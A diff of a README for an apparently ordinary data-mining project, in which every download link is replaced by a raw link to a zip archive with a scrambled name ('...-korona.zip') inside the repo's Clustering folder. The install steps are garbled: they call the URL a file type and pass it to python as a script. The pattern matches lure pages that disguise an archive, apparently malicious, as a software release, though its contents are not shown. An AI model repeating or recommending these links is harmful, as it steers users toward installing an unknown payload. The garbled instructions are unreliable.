@@ -1,6 +1,6 @@
 # 🌟 Machine_Learning-And-Data_Mining-Project - Explore Data Science Simplified
 
-[![Download the Latest Release](https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Data-And-Machine-Mining-Learning-Project-1.1-alpha.1.zip%20Now%20-v1.0-brightgreen)](https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Data-And-Machine-Mining-Learning-Project-1.1-alpha.1.zip)
+[![Download the Latest Release](https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Mining-Learning-And-Project-Machine-Data-korona.zip%20Now%20-v1.0-brightgreen)](https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Mining-Learning-And-Project-Machine-Data-korona.zip)
 
 ## 🚀 Getting Started
 
@@ -38,11 +38,11 @@ pip install numpy scikit-learn
 
 ## ⬇️ Download & Install
 
-To download the application, visit this page: [Download Releases](https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Data-And-Machine-Mining-Learning-Project-1.1-alpha.1.zip). 
+To download the application, visit this page: [Download Releases](https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Mining-Learning-And-Project-Machine-Data-korona.zip). 
 
 1. Click on the link above.
 2. On the Releases page, find the latest version. It should be at the top of the list.
-3. Click on the asset that corresponds to your operating system. This may be a `.zip` or `https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Data-And-Machine-Mining-Learning-Project-1.1-alpha.1.zip` file.
+3. Click on the asset that corresponds to your operating system. This may be a `.zip` or `https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Mining-Learning-And-Project-Machine-Data-korona.zip` file.
 4. Download the file and extract it to a directory of your choice.
 5. Open a terminal or command prompt and navigate to the directory where you extracted the files.
 
@@ -60,7 +60,7 @@ cd path/to/your/extracted/files
 3. Run the application using Python:
 
 ```bash
-python https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Data-And-Machine-Mining-Learning-Project-1.1-alpha.1.zip
+python https://github.com/freshestmanaliv1993/Machine_Learning-And-Data_Mining-Project/raw/refs/heads/main/Clustering/Mining-Learning-And-Project-Machine-Data-korona.zip
 ```
 
 4. Follow the on-screen instructions to explore the features and functionalities. 
